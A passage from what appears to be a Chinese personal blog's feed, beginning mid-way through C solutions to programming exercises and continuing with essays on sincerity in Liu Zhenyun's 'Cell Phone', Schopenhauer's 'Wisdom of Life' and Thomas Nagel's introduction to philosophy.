class="number">0</span>;i&lt;s&amp;&amp;i&lt;N;i++)&#123;<span class="built_in">scanf</span>(<span class="string">"%d"</span>,&amp;a[i]);</span><br><span class="line">        <span class="comment">//printf("s=%lld\ti=%lld\ta[%lld]=%d\n",s,i,i,a[i]);</span></span><br><span class="line">        &#125;</span><br><span class="line">        <span class="built_in">scanf</span>(<span class="string">"%lld"</span>,&amp;t);</span><br><span class="line">        <span class="keyword">for</span>(i=<span class="number">0</span>;i&lt;t&amp;&amp;i&lt;N;i++)&#123;<span class="built_in">scanf</span>(<span class="string">"%d"</span>,&amp;b[i]);</span><br><span class="line">        <span class="comment">//printf("t=%lld\ti=%lld\tb[%lld]=%d\n",t,i,i,b[i]);</span></span><br><span class="line">        &#125;</span><br><span class="line">        <span class="keyword">for</span>(i=<span class="number">0</span>,j=<span class="number">0</span>;i&lt;s&amp;&amp;j&lt;t;)&#123;</span><br><span class="line">            <span class="keyword">if</span>(a[i]&lt;b[j]||a[i]==b[j])&#123;</span><br><span class="line">                <span class="built_in">printf</span>(<span class="string">"%d "</span>,a[i]);</span><br><span class="line">                <span class="keyword">if</span>(a[i]==b[j])&#123;j++;&#125;</span><br><span class="line">                i++;</span><br><span class="line">            &#125;</span><br><span class="line">            <span class="keyword">else</span>&#123;</span><br><span class="line">                <span class="keyword">while</span>(a[i]&gt;b[j]&amp;&amp;j&lt;t&amp;&amp;i&lt;s)&#123;</span><br><span class="line">                    <span class="built_in">printf</span>(<span class="string">"%d "</span>,b[j]);</span><br><span class="line">                    j++;</span><br><span class="line">                &#125;</span><br><span class="line">            &#125;</span><br><span class="line">        &#125;</span><br><span class="line">        <span class="keyword">if</span>(i&gt;s<span class="number">-1</span>)&#123;</span><br><span class="line">            <span class="keyword">while</span>(j&lt;t)&#123;<span class="built_in">printf</span>(<span class="string">"%d "</span>,b[j]);j++;&#125;</span><br><span class="line">        &#125;</span><br><span class="line">        <span class="keyword">if</span>(j&gt;t<span class="number">-1</span>)&#123;</span><br><span class="line">            <span class="keyword">while</span>(i&lt;s)&#123;<span class="built_in">printf</span>(<span class="string">"%d "</span>,a[i]);i++;&#125;</span><br><span class="line">        &#125;</span><br><span class="line">        <span class="keyword">if</span>(i&gt;s<span class="number">-1</span>&amp;&amp;j&gt;t<span class="number">-1</span>)&#123;<span class="built_in">printf</span>(<span class="string">"\n"</span>);&#125;</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><h3 id="完美字符串"><a href="#完美字符串" class="headerlink" title="完美字符串"></a>完美字符串</h3><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">#<span class="meta-keyword">include</span><span class="meta-string">&lt;stdio.h&gt;</span></span></span><br><span class="line"><span class="function"><span class="keyword">int</span> <span class="title">main</span><span class="params">()</span></span>&#123;</span><br><span class="line">    <span class="keyword">char</span> s[<span class="number">10001</span>];</span><br><span class="line">    <span class="keyword">int</span> times[<span class="number">26</span>]=&#123;<span class="number">0</span>&#125;;</span><br><span class="line">    <span class="keyword">int</span> timesTemp;</span><br><span class="line">    <span class="keyword">long</span> ans=<span class="number">0</span>;</span><br><span class="line">    <span class="keyword">int</span> count=<span class="number">0</span>,count1;</span><br><span class="line">    gets(s);</span><br><span class="line">    <span class="keyword">while</span>(s[count]!=<span class="string">'\0'</span>)&#123;</span><br><span class="line">        times[(s[count]-<span class="string">'A'</span>)%<span class="number">32</span>]++;</span><br><span class="line">        count ++;</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">for</span>(count=<span class="number">0</span>;count&lt;<span class="number">26</span>;count++)&#123;</span><br><span class="line">        <span class="keyword">for</span>(count1=count+<span class="number">1</span>;count1&lt;<span class="number">26</span>;count1++)&#123;</span><br><span class="line">            <span class="keyword">if</span>(times[count]&lt;times[count1])&#123;</span><br><span class="line">                timesTemp=times[count];times[count]=times[count1];times[count1]=timesTemp;</span><br><span class="line">            &#125;</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line">    timesTemp=<span class="number">26</span>;</span><br><span class="line">    <span class="keyword">for</span>(count=<span class="number">0</span>;count&lt;<span class="number">26</span>;count++)&#123;</span><br><span class="line">        ans=ans+timesTemp*times[count];</span><br><span class="line">         timesTemp--;</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="built_in">printf</span>(<span class="string">"%ld"</span>,ans);</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>]]></content>
      
      
      
    </entry>
    
    <entry>
      <title>真诚与滑稽</title>
      <link href="/mind/180928-funny-solemnity/"/>
      <url>/mind/180928-funny-solemnity/</url>
      
        <content type="html"><![CDATA[<p>高中时读了刘震云的《手机》和半本《英雄时代》(误，后者是柳建伟的书，两本书是从同一个朋友那儿借的，因而产生了错误的联系)，前段时间看了根据《手机》改编的同名电影和电视剧（<code>2018/4/22 15:04~2018/4/26 1:21</code>），其中有一幕印象深刻。当时只记下大概，想在这个睡不着觉的凌晨谈谈。</p><p>沈雪跟着严守一回河南严家庄见严守一的奶，沈雪和严守礼的老婆一起聊天。沈雪问了严守礼老婆对严守一前妻于文娟的看法，又问了对费墨老婆李燕的看法，最后问到对自己的看法，这个被黑砖头称为喂猪娘们的女人扑哧笑了，又弯着腰笑了很久，终于抬头说，<code>城里女人真有意思，这种话能当面问吗？</code> 。 我相信当时沈雪是真诚地想知道自己在别人眼中的样子，并且不论好坏她不会对评价人有任何看法。但在严守礼老婆眼里，这事显得有些滑稽，我找不出别的词语来，总之是好笑。两个女人有着相似的天真和善良，但在某些方面又截然不同，沈雪属于率性，是真诚、好奇、独立思考的受过良好教育的知识分子，严守礼媳妇则依赖本性，喜欢吃，喜欢漂亮衣服，基于简单经验生活。</p><p>我听说过并认可一个理论，人表达的程度和表达环境所能提供的安全感有关。如果感到亲密、安全、可信任，就会说得多、深、直白，如果感到疏离、危险、不可信任，就会说得少、浅、委婉。严守礼媳妇儿觉得当面表达对对方的看法是不合适的，那么就意味着从不谈或是背着当事人谈是可以接受的。这中间区别何在？区别在于当事人是否会知道以及表达者是否需要直面当事人。如果是觉得谈可以，但在背后，当面不成，那其实是不太合逻辑的，因为表达已经发生，当事人是否知道并不是表达者可控的，既然认可评价他人是可接受的行为，那么在哪里评价区别并不大。如果是觉得任何时间、地点、场合不能评价任何人，在我看来严守礼媳妇儿很难有这样的自觉和克制，何况她刚刚谈过于文娟和李燕。那么很有可能是这样的，她觉得评价人没太大问题，但没有太思考过当面和背后做这件事的本质区别，只是觉得当面这样做是尴尬的，有点搞笑的。这其实也是绝大数的情况，话可以说，但不能这么说，要那么说，事可以做，但不能这么做，要那么做。偏执的人就可能问，说也说了，做也做了，弯弯绕岂不虚伪？偏执就是这个意思，偏而执之，冥顽不灵。冥顽不灵者很难改变，尽管他们自己不觉得，我可能就是其一。人分感性和理性，一个事不合逻辑，但让人舒服，这就是这事成立的道理。</p><p>所谓交浅言深的浅和深就是信任与表达的程度问题。人们从来比较相信，对着一个或一群不熟悉的人坦诚彻底地表露自己的好恶、观点是危险和不明智的，就像在室外赤身裸体。但偏执的人还是想问，赤身裸体怎么了，造物之精妙不能见人吗？古往今来，曝裈当屋算得上是比较经典的了，但即便是刘伶这样的，也 <code>由于当时的血腥统治，不能直抒胸臆，不得不采用比兴、象征、神话等手法，隐晦曲折地表达自己的思想感情。</code> ，由此可见，说不该说的话大概比不穿裤子还要可怕。</p><p>爱想的又常常爱说，所以小说这样的虚构作品是一种折衷的方式。冯唐想说 <code>其实我们最终都是要亮出阳具的，但是一开始就亮的是露阴犯，大婚之后的是行天地之礼。</code> ，王小波想说 <code>世界上的人分两种，龟头血肿之人和龟头不肿之人。你要龟头不肿的人理解血肿之痛，那是完全不可能的。唯一的办法是照他裆下猛踢一脚，让他也肿起来。</code> ，嬉笑背后想表达的东西，都得借助小说， 不太能直接发一条微博的，这是他们的智慧。然而也有人直言 <code>尔曹身与名俱灭，不废江河万古流。</code> ，<code>一个人在 **、真诚、智慧三样东西中，只可能拥有两样。</code> ，这是他们的勇气。勇气是易得的，但需要经受考验，智慧是难得的，但属于委曲求全。</p><p>想来我也曾追着别人问你怎么看我，他们有些严肃一谈，有些委婉一笑，但没有像严守礼媳妇那样说 <code>你真有意思</code> 的，所以我也不知道这个行为到底有没意思，又是怎么个意思。</p><p>真诚常常是不合时宜的，不合时宜意味着尴尬，甚至危险，那么就需要勇气或者智慧。如果都没有，可能闭嘴就会比较合适一些。</p><p><strong>《手机》语录</strong></p><ul><li>手机连着你的嘴，嘴巴连着你的心。你们这手机里头有好多不可告人的东西。</li><li>近，太近咯，近得人都喘不过气来咯。——费墨</li><li>严守一回北京后，再也没有用手机。</li><li>我不用手机，没人找我。——于文娟</li><li>牛三斤，牛三斤，你的媳妇叫吕桂花。吕桂花让问一问，最近你还回来吗？</li></ul>]]></content>
      
      
      
    </entry>
    
    <entry>
      <title>《人生的智慧·一》</title>
      <link href="/mind/180924-happy-mid-autumn-festival/"/>
      <url>/mind/180924-happy-mid-autumn-festival/</url>
      
        <content type="html"><![CDATA[<blockquote><p> 我们离开这个世界的时候，这个世界还是照样愚蠢和邪恶，跟我们刚来到这个世界的时候所发现的并没有两样。——伏尔泰</p></blockquote><p>今天是2018年的中秋，无线电活跃着，手机震动着，头像闪烁着，美好愿望在亲密、熟识、数面之缘、互有耳闻、素不相识的人们之间传播着，一派自然而然，喜悦欢快的景象。而我熄灭屏幕，看见生活如旧，不安依然。 </p><p>人们不说 <code>中秋暴富</code> ，<code>中秋成名</code> ，而是说 <code>中秋快乐</code> ，除羞于直言外，可能说明有意识或无意识地，人们归根结底想要的是快乐和幸福。如果幸福是指称心、愉快地生存，使生存是因幸福本身而非恐惧死亡，使我们渴望生存永续，那么叔本华的哲学已经清晰地指出了幸福生存从形而上出发是不存在的。而人生的智慧就在于离开高角度，从形而上转到形而下，承认相对的价值，预设幸福的存在，然后从平常、实用的角度去探讨和追求。</p><p>亚里士多德将人在世上的一切三分为外物，人的身体和人的灵魂，叔本华则有另一种三分方式：</p><blockquote><p>①人的自身，即在最广泛意义上属于人的个性的东西。因此，它包括人的健康、力量、外貌、气质、道德品格、精神智力及其潜在发展。</p><p>②人所拥有的身外之物，亦即财产和其他占有物。</p><p>③人向其他人所显示的样子，这可以理解为：人在其他人眼中所呈现的样子，以及人们对他的看法。他人的看法又可分为名誉、地位和名声。</p></blockquote><p>如果将②③称为客体，将①称为主体，叔本华认为客体经由主体作用于人，因此主体无可避免地对人幸福与否具有根本而彻底的影响。主体是持久不变而不可予夺的，客体则相反，因此获得幸福的要义在于尽力使客体自洽于主体，体力强的从事体力活动，脑力强的从事脑力活动，好竞争的浪头弄潮，随缘分的皓月扁舟，各得其所，各安其心。至于追逐财富，在叔本华看来则是舍本逐末， <code>财富除了能满足人的真正、自然的需求以外，对我们的真正幸福没有多大影响</code> 。叔本华很有钱，而我没有，所以我还不懂。</p><p>叔本华说 ，<code>“如果一个人能够享有自己卓越的、与众不同的精神个性所带来的乐趣，那么普通大众所追求的大部分乐趣对于他来说，都是纯属多余的，甚至是一种烦恼和累赘。”</code> 。我基本赞同这样的观点，但问题在于，普通大众在审视主体客体关系时如何自处？换言之，如果我的精神个性是标配的，乏味无趣的，那么我注定无法 <code>超越只能领略平庸无奇、夹杂着动物性的快乐的范围</code> 吗？当笨蛋发现自己笨时，他还是一个笨蛋吗？如果他觉得聪明比笨好，又有意变得聪明，却不幸任何努力都无助于改变笨的事实，那他会成长为一个怎样的笨蛋呢？除了痛苦别无出路吗？</p><p>美丽与丑陋，健壮与羸弱，聪明与愚钝，善良与罪恶，博爱与自私，社会对个人的评价体系中存在许多诸如此类的对立，分别之心也因此普遍存在。而如果主体是不可改变的，笨蛋至死是笨蛋，那一个有自知之明的笨蛋，姑且称他为笨蛋吧，如何获得属于他的幸福呢？</p><p>叔本华认为 <code>最高级、最丰富多彩以及维持最为恒久的乐趣是精神思想上的乐趣</code> 。也许是因为经历不足，我对此持怀疑态度。乐趣作为主观感受，区分高低级是否是偏见？假设感官上的刺激能够不断升级变化，它所带来的乐趣在丰富性和恒久性方面与精神乐趣何异？况且丰富恒久的思想乐趣并不见得比丰富恒久的感官乐趣易得。</p><p>如果将主体简化为人的个性，有一些问题是不应急于断言，值得思考的。</p><ul><li><p>人如何认识自己的个性</p></li><li><p>个性是可以改变的吗</p><ul><li><p>如果个性可以改变，如何改变</p></li><li><p>如果个性不能改变，如何顺应个性以获得幸福</p><ul><li><p>顺应个性在多大程度上可能</p><ul><li>职业选择</li><li>婚姻选择</li><li>……</li></ul></li></ul></li></ul></li></ul><p>也许我对人们的腼腆程度和戏谑限度有些误解吧，一觉醒来表情包已经铺天盖地 😲</p><p><img src="1537772503657.png" alt="1537772503657"></p><p>⬇⬇⬇⬇⬇</p><p><img src="1537772517175.png" alt="1537772517175"></p><p>⬇⬇⬇⬇⬇</p><p><img src="1537772851905.png" alt="1537772851905"></p><p>⬇⬇⬇⬇⬇</p><p><img src="1537772526454.png" alt="1537772526454"></p><p>⬇⬇⬇⬇⬇</p><p><img src="1537800825642.png" alt="1537800825642"></p>]]></content>
      
      
      
    </entry>
    
    <entry>
      <title>从《你的第一本哲学书》想到的</title>
      <link href="/mind/180830-what-does-it-all-mean/"/>
      <url>/mind/180830-what-does-it-all-mean/</url>
      
        <content type="html"><![CDATA[<p>此书原是一本名为 <strong><em><a href="http://practicalphilosophy.in/wp-content/uploads/2015/10/WHAT-DOES-IT-ALL-MEAN.pdf" target="_blank" rel="noopener">What Does It All Mean?  A Very Short Introduction to Philosophy</a></em></strong>  的小册子，由美国哲学家 <strong>Thomas Nagel</strong> 编写。我读的是宝树的中文译本 <a href="http://www.sssch.net/Admin/ckfinder/userfiles/files/xinlizixun/yueduliaofa2/shu/%E4%BD%A0%E7%9A%84%E7%AC%AC%E4%B8%80%E6%9C%AC%E5%93%B2%E5%AD%A6%E4%B9%A6.pdf" target="_blank" rel="noopener">《你的第一本哲学书》</a> ，总体来说用词准确，衔接流畅，但有些地方有些粗糙，略感生涩，须对照原文多读几遍。</p><p>书籍分为几个小节： <strong>外部世界是否存在、他人的心灵、身心问题、词语的意义、自由意志、对与错、公正、死亡、生活的意义</strong> 。由于每个主题都平易近人且值得深思，也多是我自己或深或浅琢磨过的，加之作者表述逻辑清晰，幽默优雅，读起来如坐春风如流水，时有会心一笑或击节叹赏。</p><p>对于每一个主题，作者先描述一些许多人自然而然便会提出的疑问，然后给出各种常见的假设和对于假设的反驳，甚至是对假设的反驳的反驳，到最后我们虽然了解了问题的多种可能的答案，但问题依然处于悬而未决的状态，种种追问所面对的基本不再是我们能够论证什么，而是我们选择相信什么，这颇有些可笑和无奈。</p><p>作者留下句 <code>也许生命不只没有意义，而且是一出荒诞剧。</code> (<code>Life may be not only meaningless but absurd.</code>) 便不再多说。书中谈及的这些可能的答案我都发现或接触过，也自以为能理解七八分，但始终不甚满意，或者更诚实地说，不愿接受。这让我觉得可能一切也不过尔尔，一代代人围着一个个基本问题敲敲打打而至今无果，我又何苦执着呢？</p><p>读了一点《大问题：简明哲学导论》，我猛然发现自己大概错了，多年求索却至今才看到正确的方向。哲学的最重要的可能不是提出问题，这本书的中文译名也不是没有道理，在这些疑问和假设的背后是一个个庞大的理论体系，等待我们的深入探索。不停追问是本能，阅读理解别人的答案也不难，困难在于有所相信，并能够  <strong><code>尽我所能去有力地优雅地有风格地明确表达和论证</code> </strong> 我所相信的一切。 </p><p>表达对做哲学至关重要，表达不是为了让别人认识我，是为了让我认识我自己。为什么只有表达能做到，因为我是怎样的与我想象中的自己是有偏差的，与我如何表达自己也是有偏差的，但后者偏差更小。实在的我存在于实在的世界，我如何表达自己基本上就决定了我是怎样的。与其说我通过表达自己来认识自己，不如说我通过表达自己来塑造自己，实现自己，定义自己。更直接地，我就是我所表达的一切。</p><p>更激进一点，如果我不表达，那么我就不存在。如果农夫不再耕种，作家不再写作，母亲不再孕育，世上就不再有农夫、作家或母亲。厨师要下厨，司机要开车，工人要搬砖，画家要作画，诗人要写诗，这一切不能在想象中完成。我们都必须靠所作所为成为自己，而也只有成为了自己，认识自己才成为一种可能。</p><p>我终其一生，大概不过是为了做好这一件事，认识我自己。虽然建立自己的哲学未必是我所能胜任的，但从各伟大人物的哲学世界中借些理论，拾些牙慧来过好自己的生活却是可能的。我选择我所相信的，并在表达和论证中确信，从而停下无止境、无答案、无意义的追问，摆脱模棱两可的颓唐秉性和进退两难的思维困局，进而得到宁静，享受当下。上一篇博客里我写了几行表达哲学自杀的代码，现在想来是不对的。此刻我想这样说，哲学不死，自杀无用，从大哉问的深渊中出来也许只是做哲学路上的第一个里程碑。</p><p>（后来发现上面悟到的表达和认识的关系颇有些阳明心学中所谓知行合一的意思😮）</p><p>下面谈谈这本书的主要议题。</p><h1 id="外部世界是否存在"><a href="#外部世界是否存在" class="headerlink" title="外部世界是否存在"></a>外部世界是否存在</h1><p>既然人通过感官体验外部世界，人和外部世界之间就隔着一个感官，那么人如何确定外部世界的存在，又如何可能认识外部世界？</p><p>这里面最本质的问题在于我们能在多大程度上相信自己的感官。举个简单的例子，我们看到的电影实际上由每秒超过24张的图片组成，而我们的眼睛是意识不到这点的。我们了解了这个现象，便觉得稀松平常，但还有多少是我们所不了解的呢？从眼睛到五官，再到大脑本身，推而广之，细思恐极。每当我们以为找到可依赖的证据来表明客观世界的存在，我们都会发现这证据本身依然依赖于感官，于是我们陷入自我中心困境(Egocentric Predicament)。外部世界如何存在，甚至是否存在，和我们所感知到的，在多大程度上是一致的呢？可能大相径庭，还可能背道而驰。</p><p>有些人认为除了自己的精神外没有任何东西存在，我们称之为唯我论(Solipsism)。</p><p>有些人对客观世界和客观真理是否存在、能否认识表示怀疑，我们称之为怀疑论(Skepticism)或不可知论。</p><p>有些人认为既然我们始终生活在经由感官去认识的世界里，那么这个世界对我们而言就是毋庸置疑的真实。就像如果一场梦无法醒来，那这梦和真实概念就要重新审视，这场梦就是梦里人全部的真实。这种观点我们称之为验证论(Verificationism)。</p><p>纯粹的唯我论者或怀疑论者没有出路，必须有一些验证论的心思才可能正常地生活下去。既然我们关于外部世界存在的信念是发自本能而坚定有力的，我们就应当顺从这种本能，至少相信生活中一部分事理的理所当然。也只有这样，更深的追问才有可能发生。</p><h1 id="他人的心灵"><a href="#他人的心灵" class="headerlink" title="他人的心灵"></a>他人的心灵</h1><p>除了问我所感受到的是真的吗，我们还会问我所感受到的和其他人所感受到的是一样的吗。人和人的交流依赖概念，人对世界的认识依赖感知，不同人建立起的概念和感知的对应关系却未必是一致的。我们都称为红色的东西可能在不同人眼中是完全不一样的感受，这个逻辑是自洽的，不能证否的，但我觉得对生活没有太大影响，可能只有高度智慧而高度敏感的人才会感到苦恼吧，</p><h1 id="身心问题"><a href="#身心问题" class="headerlink" title="身心问题"></a>身心问题</h1><p>意识依附于大脑的物理活动，还是就是物理活动本身？别人能打开、观察、测量我的大脑，但无法捕捉我的感受。那么我的感受究竟存在于何处？</p><p>有些人认为人由复杂的生理有机体加上一个完全精神性的灵魂，我们称之为二元论(Dualism)；</p><p>有些人认为精神就是大脑的生理状态，我们称之为物理主义(Physicalism)或唯物主义(Materialism)；</p><p>也有一种两面论(Dual Aspect  Theory)，大概说的是有一种大脑状态，对外表现为物质，对内呈现为感受，我不太能理解。</p><p>默认接受验证论后我们很自然地承认物质的实在性，但对于精神的实在性仍然存疑。自然科学在研究物质实在的基础上走了很远，但仍有许多东西无法解释，也许将来会需要借由神秘的心灵实在来认识。</p><h1 id="词语的意义"><a href="#词语的意义" class="headerlink" title="词语的意义"></a>词语的意义</h1><p>我们需要一些直接能感受到意义的词来作为词语解释的基础，否则无论试图解释什么概念，都必然陷入无穷的循环定义。提问者只要对定义中的概念不断问是什么，回答者终将崩溃。而这些可以用来解释其他概念的基本概念如何起作用，我们所说所写的一切，又如何可能具有意义？这一切都很神秘，值得探索。</p><h1 id="自由意志"><a href="#自由意志" class="headerlink" title="自由意志"></a>自由意志</h1><blockquote><p>你下决定的过程，只不过是事先被决定的结果在你头脑中出现的过程而已。</p></blockquote><p>看到这样一句话，不夸张地说，有些不寒而栗。</p><p>有些人怀疑人的主观能动性，车不会自己开，同样的，人也需要被某些东西驱动（可能是一时情境下的诸多复杂因素的合成），人们常常以为这些驱动我们的东西是自己可以控制的，实际上，可能并非如此。</p><p>有些人有一套称为决定论(Determinism) 的完美说辞：</p><p><img src="1535713234445.png" alt="1535713234445"></p><p>一切行为在当时情境下都是必然，可追溯前因，而前因也有其前因，层层叠叠，至于无穷，不可总结，不可分析，也不可预料。人的一切行为被周围环境和心理条件所决定，人是因果律的傀儡，并没有自由选择的可能。既然选择不是自由的，那么责任便无从谈起。我走在路上，被一个石头绊倒，和被一个人故意伸出腿绊倒，我应该有同样的心情。我知道抱怨石头没有用，那么我就应该知道抱怨人也没有用。决定论同时导致是非对错的模糊，一切无可褒贬，善无需嘉奖，恶亦无可指摘，人们都不得不，一切都无选择，人的恶行应当被当作自然灾害去对待：）</p><p>如果不是这样的呢？如果人有选择，在作出选择前任何一种选择都是可能发生的呢？那么情况就会显得更加怪异。如果人的行为不是和人的愿望、人格、信念有关的话，那么人的行为是在无缘无故地发生？那如果行为是无缘无故地发生，责任更加无从谈起了。</p><p>正反都走不通，只能说细思恐极。</p><h1 id="对与错"><a href="#对与错" class="headerlink" title="对与错"></a>对与错</h1><p>我们如何衡量对错，很多人最开始的想法本质上都是根据规则，违反规则既是错，反之即对。那么规则的对错用什么来衡量呢？</p><p>“规则就是规则，是约定俗成的东西，其本身没有对错”这样的观点可说得通，但能够真正接受它的人恐怕不多。因为如果真是这样，就意味着世上没有对错，只有规则，我们只是用对错来简便地称呼一个行为是否符合规则。没有对错这个事实是难以接受的，因为它让人们的道德感显得滑稽，对人性有所亵渎。</p><p>如果规则有对错，那么就一定有超乎规则的东西可用于判定对错，是什么呢？一个容易想到的词是道德。我们也许可以用是否合乎道德来考量一个行为的对错。</p><p>从多年前开始有意识地审视道德起，我就一直觉得这是个奇怪的东西。它因人而异，在同一个人身上也因时而异，因事而异，它前后矛盾，纠缠不清，尤其在面对复杂的情况时显得边界模糊，十分无力。直到今天，我在这本书中明晰了一个观点：道德不是普遍而客观的，道德的基础是我们对他人的关心。关心他人的感受，关心他人对我们的看法使我们具有道德。一个人对他人有多少关心，他就有多少的道德感和对自我的道德要求。如果一个人完全不在意自身之外的人事物理，那么他就没有道德，对他而言，事无对错，天地宽广。而一个无所相信，无所关怀的人极大可能无恶不作，所以社会需要通过家庭教育、社区教育、校园教育来维持其成员的道德感水平，通过法律来提高作恶成本。</p><p>书中还提到为道德辩护的难点在于我们的行为有太多的动机。这不难理解，因为道德基于关心，而关心有优先级，会变化，纯然主观。对动机的考量本身是困难的，<code>伯夷辞之以为名，仲尼语之以为博</code>  就是对动机的一种诡辩和嘲讽，和对道德的质疑。</p><p>突然想到鲁迅先生的 <code>无尽的远方和无数的人们都与我有关</code> ，我曾感叹这是一种浩瀚的真情。现在我更明白了，这是一种崇高的道德，一种接近圣人的观念。</p><h1 id="公正"><a href="#公正" class="headerlink" title="公正"></a>公正</h1><p>要决定一个人在竞争社会中的收入和地位，需要自然天赋和家庭背景两方面的运气。因此不平等也就来自于这两方面，一是出于社会经济地位的差异，二是出于社会所需要的自然天赋或者才能上的差异。</p><p>对于前者，政府通过税收、再分配和提供社会公共福利来干预经济生活，缩小贫富差距。而对于后者我们难有十分有效的作为，而且更合理的做法也不该是有太多作为。</p><p>生活总是这样，总有一些人比另一些人幸运，只有不幸是由一个人对另一个人的错误行为造成的时候，我们才能对此加以干涉（修正）。</p><h1 id="死亡"><a href="#死亡" class="headerlink" title="死亡"></a>死亡</h1><p>人们相信死后世界如何和人们如何看待身心问题是紧密相关的。</p><ul><li>一切的证据都显示出：在人死去之前，有意识的生命完全依赖于神经系统的运行。如果我们只相信通常的观察，不涉及宗教教义或通灵术之类的，似乎没有理由相信死后生活的存在。</li><li>另外一些人可能出于宗教信仰就能够相信死后的生活，而不需要任何证据。我本人并不完全理解这种由信仰激励的观念是如何可能的。但显然有人能够理解，甚至认为这很自然。</li></ul><p>死了就没有了的话，也没有什么可怕的，毕竟你也感受不到。一个有趣的思路是，你出生前的世界也没有你，你会因为自己的突然存在而感到害怕吗？显然一般不会，而这两种状态转换实际上是没有太大分别的。</p><h1 id="生活的意义"><a href="#生活的意义" class="headerlink" title="生活的意义"></a>生活的意义</h1><p>关于意义的思考，一个直接的思路是既然一切关于我的都将从有变无，那么我所做的一切意义何在？</p><p>直观上看，这个思路是无解的，哪怕是胡适的 <a href="https://findneo.github.io/mind/180731-philosophical-suicide/#%E8%83%A1%E9%80%82%E2%80%94%E2%80%94%E7%A4%BE%E4%BC%9A%E4%B8%8D%E6%9C%BD">社会不朽论</a> 也没有用，因为社会不朽只有在社会本身有意义的前提下才有意义。（如果想直观感受下，可以看看《三体》中二向箔摊平太阳系的场景。）</p><p>希望这个问题有解，就得重新审视意义。意义从哪里来，意义和永恒是怎样的关系，永恒又意味着什么。当我们在讨论意义、目的、价值时，我们指的是什么？</p><p>饥则食，渴则饮，困则眠，生活的每个行为也许都可以得到解释，其目的都很清晰。但如果把生活当作一个整体去考量，我是否存在过都是无关紧要的，更别谈我如何存在有什么意义了。</p><p>所以，解决无意义只有一种方式，把意义降级为目的。然后我就会发现丰富的目的，远离匮乏的意义😀。</p><p>然而，这不会起作用的。就像作者所说：</p><p><img src="1535724689613.png" alt="1535724689613"></p><p>全书的最后两段感触甚深，贴上来并且自己翻译一下：</p><blockquote><p>Even if life as a whole is meaningless, perhaps that’s nothing to worry about. Perhaps we can recognize it and just go on as before. The trick is to keep your eyes on what’s in front of you, and allow justifications to come to an end inside your life, and inside the lives of others to whom you are connected. If you ever ask yourself the question, “But what’s the point of being alive at all?” – leading the particular life of a student or bartender or whatever you happen to be – you’ll answer “There’s no point. It wouldn’t matter if I didn’t exist at all, or if I didn’t care about anything. But I do. That’s all there is to it.”</p><p>Some people find this attitude perfectly satisfying. Others find it depressing, though unavoidable. Part of the problem is that some of us have an incurable tendency to take ourselves seriously. We want to matter to ourselves “from the outside.” If our lives as a whole seem pointless, then a part of us is dissatisfied – the part that is always looking over our shoulders at what we are doing. Many human efforts, particularly those in the service of serious ambitions rather than just comfort and survival, get some of their energy from a sense of importance – a sense that what you are doing is not just important to you, but important in some larger sense: important, period. If we have to give this up, it may threaten to take the wind out of our sails. If life is not real, life is not earnest, and the grave is its goal, perhaps it’s ridiculous to take ourselves so seriously. On the other hand, if we can’t help taking ourselves so seriously, perhaps we just have to put up with being ridiculous. Life may be not only meaningless but absurd.</p></blockquote><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">/*</span></span><br><span class="line"><span class="comment">也许生命无意义也无妨，我们大可以意识到这一点，然后一切照旧。</span></span><br><span class="line"><span class="comment">做到这点的技巧在于要只关注眼前，只在你和周围人的生活中寻找做事的理由。</span></span><br><span class="line"><span class="comment">每当自问“生活到底有何意义”，你就告诉自己</span></span><br><span class="line"><span class="comment">“没有意义呀。如果我不曾存在或对一切漠不关心也就罢了，但我已存在，也有所关心，便无需多言。”。</span></span><br><span class="line"><span class="comment"></span></span><br><span class="line"><span class="comment">有些人满足于此，有些人不可避免地感到沮丧。</span></span><br><span class="line"><span class="comment">沮丧的部分原因在于这些人总是把自己看得太重，希望生命在自身之外仍有意义。</span></span><br><span class="line"><span class="comment">如果生活整体看上去了无意义，总是反躬自省的那部分自我就会感到失落。</span></span><br><span class="line"><span class="comment">人类的大部分努力，尤其是那些为高于生存的雄心壮志所付出的，都从重要感中获得力量。</span></span><br><span class="line"><span class="comment">这种重要感就是：你所做的一切不只是对自己重要，而是从某种更大的意义上来说，它本身就很重要。</span></span><br><span class="line"><span class="comment">如果我们放弃了这种重要感，我们的生活之船就不再能鼓起前进的风帆。</span></span><br><span class="line"><span class="comment">如果生活既非真实，也不严肃，死亡是唯一目的，那么把自己看得太重就很可笑。</span></span><br><span class="line"><span class="comment">也就是说，如果无法放下重要感，那么就得忍受荒谬感。</span></span><br><span class="line"><span class="comment">所以，生活也许不仅无意义，而且很荒唐。</span></span><br><span class="line"><span class="comment">*/</span></span><br></pre></td></tr></table></figure><h1 id="结语"><a href="#结语" class="headerlink" title="结语"></a>结语</h1><p>回头看，我几乎曾一个人走完书中所有的心路历程，我总以为后面还有东西，但作者说人生无意义，人生很荒唐，然后言尽于此，所以我只是又确认了一遍那种绝望感。也许真的，关心你所关心的一切就好了，除了意义本身。</p>]]></content>
      
      
      
    </entry>
    
    <entry>
      <title>【转】我的信仰——胡适</title>
      <link href="/mind/180822-my-faith/"/>
      <url>/mind/180822-my-faith/</url>
      
